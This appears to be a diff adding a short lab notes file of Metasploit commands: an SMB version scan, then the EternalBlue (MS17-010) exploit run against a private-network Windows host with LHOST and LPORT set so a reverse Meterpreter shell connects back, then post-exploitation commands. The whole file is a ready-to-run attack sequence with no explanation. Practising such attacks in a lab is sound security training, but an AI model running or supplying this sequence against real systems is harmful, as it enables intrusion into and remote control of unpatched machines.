@@ -1,0 +1,24 @@
+List of commands:
+
+*Scanning*
+msfconsole
+use auxiliary/scanner/smb/smb_version
+set RHOSTS 192.168.10.55
+run
+exit
+
+*Exploit*
+msfconsole
+use exploit/windows/smb/ms17_010_eternalblue
+show options
+set RHOSTS 192.168.10.55
+set LHOST 192.168.10.57
+set LPORT 4444
+run
+*Meterpreter Session 1 opened*
+
+*Post Exploitation*
+sysinfo
+ps
+sessions -k 1
+exit
